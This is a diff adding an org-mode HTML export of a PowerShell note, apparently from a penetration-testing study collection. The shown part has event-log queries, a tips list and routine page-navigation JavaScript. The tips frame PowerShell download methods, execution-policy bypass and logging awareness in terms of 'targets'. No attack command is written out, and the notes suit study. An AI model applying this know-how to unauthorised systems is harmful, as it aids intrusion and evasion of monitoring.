+</span><span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Get-WinEvent</span> <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-LogName</span> <span style="color: var(--clr-string); background-color: var(--bg-string);">"Microsoft-Windows-PowerShell/Operational"</span> <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-MaxEvents</span> 100
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Filter by time
+</span><span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Get-EventLog</span> <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-LogName</span> System <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-After</span> (<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Get-Date</span>).AddHours(-24)
+</pre>
+</div></div>
+
+<p>
+See <a href="../org/20260206T060740--windows-event-logs__concept_cybersecurity.html">Windows Event Logs</a> for Event ID reference.
+</p>
+</div>
+</div>
+<div id="outline-container-orgbd367ee" class="outline-2">
+<h2 id="orgbd367ee">Tips</h2>
+<div class="outline-text-2" id="text-orgbd367ee">
+<ul class="org-ul">
+<li>Use <code>Get-Help</code> and <code>Get-Command</code> constantly — PowerShell's
+built-in help is comprehensive and includes examples</li>
+<li>The pipeline is the core skill — chaining <code>Where-Object</code> and
+<code>Select-Object</code> handles most data filtering without external tools</li>
+<li><code>Invoke-WebRequest</code> (<code>iwr</code>) and <code>(New-Object Net.WebClient)</code> are
+the two standard download methods — know both since one may be
+blocked on hardened targets</li>
+<li>Execution policy is not a security boundary — it can be bypassed
+trivially; on a target system do not rely on it to prevent
+malicious scripts from running</li>
+<li>Transcription logging (<code>Start-Transcript</code>) and ScriptBlock
+logging write all executed PowerShell to event logs — assume
+all PowerShell activity is logged on hardened environments</li>
+</ul>
+</div>
+</div>
+</div>
+<div id="postamble" class="status">
+<script type="text/javascript">
+<!--/*--><![CDATA[/*><!--*/
+if (!document.cookie.split('; ').find(r => r.startsWith('mode'))) {
+document.cookie = 'mode=dark'
+}
+document.cookie = 'light=modus-operandi-tinted'
+document.cookie = 'dark=modus-vivendi-tinted'
+/*
+;; nice-org-html.js
+;;==============================================================================
+;; Copyright (C) 2024, Ewan Townshend
+
+;; Author: Ewan Townshend
+;; URL: https://github.com/ewantown/nice-org-html
+;; Version: 1.2
+
+;;==============================================================================
+;; This program is free software; you can redistribute it and/or modify
+;; it under the terms of the GNU General Public License as published by
+;; the Free Software Foundation, either version 3 of the License, or
+;; (at your option) any later version.
+
+;; This program is distributed in the hope that it will be useful,
+;; but WITHOUT ANY WARRANTY; without even the implied warranty of
+;; MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+;; GNU General Public License for more details.
+
+;; You should have received a copy of the GNU General Public License
+;; along with this program.  If not, see <https://www.gnu.org/licenses/>.
+
+;; This file is not part of emacs.
+
+;;==============================================================================
+;; JS for html exported by et-org-html.el
+ */
+
+const preamble = document.getElementById("preamble");
+const content = document.getElementById("content");
+const postamble = document.getElementById("postamble");
+
+const controls = document.getElementById("view-controls");
+const toggleTocBtn = document.getElementById("toggle-toc");
+const gotoTopBtn = document.getElementById("goto-top");
+const toggleModeBtn = document.getElementById("toggle-mode");
+const toc = document.getElementById("table-of-contents");
+
+// Get and parse options passed in cookie string
+const optCookie = document.cookie.split('; ').find(r => r.startsWith('options'));
+const options = {};
+if (optCookie) {
+  optCookie.split('=')[1].split('__').forEach(pair => {
+    const [key, val] = pair.split(':');
+    if (key && val) {
+      options[key] = val;
+    }
+  })
+}
+
+// Move sticky control bar (injected within preamble)
+document.body.insertBefore(controls, content);
+
+// Mode handling
+function getMode() {
+  let cookie = document.cookie.split('; ').find(r => r.startsWith('mode'))
+  return cookie && cookie.split("=")[1];
+}
+
+function setMode(mode) {
+  document.body.dataset.mode = mode;
+  let thmCookie = document.cookie.split('; ').find(r => r.startsWith(mode));
+  document.body.dataset.theme = thmCookie ? thmCookie.split('=')[1] : 'unknown';
+  toggleModeBtn.innerHTML = (mode === 'light') ? '&#9789;' : '&#9788;';
+  document.cookie = 'mode=' + mode;
+}
+
+// Initially, set mode based on stored cookie
+let mode = getMode();
+if (mode && ["light", "dark"].includes(mode)) {
+  setMode(mode);
+} else {  
+  let prop = "prefers-color-scheme";
+  let pref = (mode === "query") && window.matchMedia &&
+    ["light", "dark"].find(s => window.matchMedia(`(${prop}: ${s})`).matches);
+  setMode(pref || "dark"); // fallback: dark
+}
+
+// Mode toggling
+toggleModeBtn.addEventListener('click', () => {
+  setMode(document.body.dataset.mode === 'dark' ? 'light' : 'dark');
+})
+
+
+// Jump to top
+let scrollY = document.documentElement.scrollTop;
+window.addEventListener('scroll', () => {
+  let atTop = document.documentElement.scrollTop <= preamble.offsetHeight;
+  gotoTopBtn.dataset.show = !atTop + "";
+});
+gotoTopBtn.addEventListener('click', () => {
+  window.scrollTo({
+    top: 0,
+    behavior: "smooth"
+  });
+})
+
+// Table-of-contents toggling
+if (toc) {
+  toggleTocBtn.dataset.show = 'true';
+  toggleTocBtn.addEventListener('click', () => {
+    let showingToc = document.body.dataset.toc;
+    scrollY = showingToc ? scrollY : document.documentElement.scrollTop;
+    if (showingToc) {
+      document.body.dataset.toc = '';
+      document.documentElement.scrollTop = scrollY;
+    } else {
+      let tocHeight =
+	Math.max(
+	  window.innerHeight - controls.offsetHeight,
+	  toc.offsetHeight
+	);
+      const header = document.getElementById("injected-header");
+      if (header && (scrollY > header.offsetHeight)) {
+	document.documentElement.scrollTop = preamble.offsetHeight;
+      }
+      toc.style.height = `${tocHeight}px`;
+      document.body.dataset.toc = 'true';
+    }
+    toc.addEventListener('click', () => {
+      if (document.body.dataset.toc) {
+	document.body.dataset.toc = '';
+	document.documentElement.scrollTop = scrollY;
+      }
+    })
+  })
+};
+
+// Instrument anchor linking for sticky control bar
+document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+  anchor.addEventListener('click', (e) => {
+    e.preventDefault();
+    const targetId = e.currentTarget.getAttribute('href');
+    const target = document.querySelector(targetId);
+
+    setTimeout(() => {
+      const targetPos = target.getBoundingClientRect().top;
+      let offset = targetPos + document.documentElement.scrollTop;
+      offset -= controls.offsetHeight;
+      window.scrollTo({
+	top: offset,
+	behavior: "smooth"
+      });
+    }, 0);
+  });
+});
+
+function copyTextToClipboard(text) {
+  // Make invisible textarea
+  var textArea = document.createElement("textarea");
+  textArea.style.position = 'fixed';
+  textArea.style.top = 0;
+  textArea.style.left = 0;
+  textArea.style.width = '2em';
+  textArea.style.height = '2em';
+  textArea.style.padding = 0;
+  textArea.style.border = 'none';
+  textArea.style.outline = 'none';
+  textArea.style.boxShadow = 'none';
+  textArea.style.background = 'transparent';
+
+  // Copy contents into it
+  textArea.value = text;
+
+  // Try to copy from it to clipboard
+  document.body.appendChild(textArea);
+  textArea.focus();
+  textArea.select();
+  var res;
+  try {
+    res = document.execCommand('copy');
+  } catch (err) {
+    res = false;
+  }
+
+  // Remove invisible textarea
+  document.body.removeChild(textArea);
+
+  return res;
+}
+
+// Handle the default header / footer drawers
+const header = document.getElementById("generated-header");
+const footer = document.getElementById("generated-footer");
+
+if (header) {
+  let toggle = header.querySelector("header nav input.nav-toggle");
+  if (toggle) { toggle.checked = false; }
+}
+if (footer) {
+  let nav = footer.querySelector("nav");
+  let toggle = nav && nav.querySelector(".nav-toggle");
+  let navList = nav && nav.querySelector(".nav-list");
+  let navElem = navList && [...navList.querySelectorAll(".nav-item")];
+  let numLink = navElem && navElem.length;
+  if (numLink) {
+    toggle.checked = false;
+    toggle.addEventListener('change', () => {
+      if (toggle.checked) {
+	setTimeout(() => window.scrollTo({
+	  behavior: 'smooth',
+	  top: document.body.scrollHeight	  
+	}), 88);
+      }
+   });
+  }
+}
+
+function autoCompact() {
+  var anchor, links, overlap, trivial;
+  const domCompute = (node) => {
+    if (node) {
+      anchor = node.querySelector('.nav-title, .nav-author');
+      links = node.querySelector('.nav-list');
+      overlap = links.offsetLeft - 5 <= anchor.offsetLeft + anchor.offsetWidth;	
+      trivial = links.offsetLeft === anchor.offsetLeft;
+    }
+  };
+  let mediaMatch = window.matchMedia('(max-width: 768px)').matches;
+  [header, footer].forEach(e => {
+    if (e) {
+      if (mediaMatch) {
+	e.classList.add('compact');
+      } else {
+	domCompute(e);
+	if (overlap && !trivial) {
+	  e.classList.add('compact');
+	} else {	
+	  let clone = e.cloneNode(true);
+	  clone.style.top = '-2000px';
+	  clone.style.maxHeight = '0px';
+	  clone.classList.remove('compact');
+	  e.parentNode.insertBefore(clone, e);
+	  domCompute(clone);
+	  let toggle = e.querySelector('.nav-toggle');
+	  if (!overlap && toggle && !toggle.checked) {
+	    e.classList.remove('compact');
+	  }
+	  e.parentNode.removeChild(clone);
+	}
+      }
+    }
+  })
+}
+
+if ((header || footer)) {
+  if (options.hasOwnProperty('layout')) {
+    [header, footer].forEach(e => e ? e.classList.add(options.layout) : null);
+  } else {
+    autoCompact();
+    window.addEventListener('resize', autoCompact);
+  }
+}
+
+if (options.hasOwnProperty('src-lang') && options['src-lang'] == 't') {
+  let labels = [...document.querySelectorAll('.srcLangLabel')];
+  labels.forEach(l => l.style.display = 'inline-block');
+}
+
+if (options.hasOwnProperty('collapsing') && options.collapsing == 't') {
+  let levels = [2, 3, 4, 5, 6];
+  let containerPrefix = 'outline-container-';
+  levels.forEach(l => {
+    let containers = [...document.querySelectorAll(`.outline-${l}`)];
+    containers.forEach(c => {
+      let id = c.id.slice(containerPrefix.length);
+      let headline = document.getElementById(id);
+      let siblings = [...c.children].filter(child => child.id != id);
+      headline.classList.add('collapsible');
+      headline.addEventListener('click', () => {	
+	if (headline.classList.contains('collapsed')) {
+	  headline.classList.remove('collapsed');
+	  siblings.forEach(child => {
+	    child.classList.remove('hidden');
+	  });	  
+	} else {
+	  headline.classList.add('collapsed');
+	  siblings.forEach(child => {
+	    child.classList.add('hidden');
+	  });
+	}
+      })
+    })
+  })
+}
+/*]]>*/-->
+</script><div hidden>Generated by: https://github.com/ewantown/nice-org-html</div>
+</div>
+</body>
+</html>
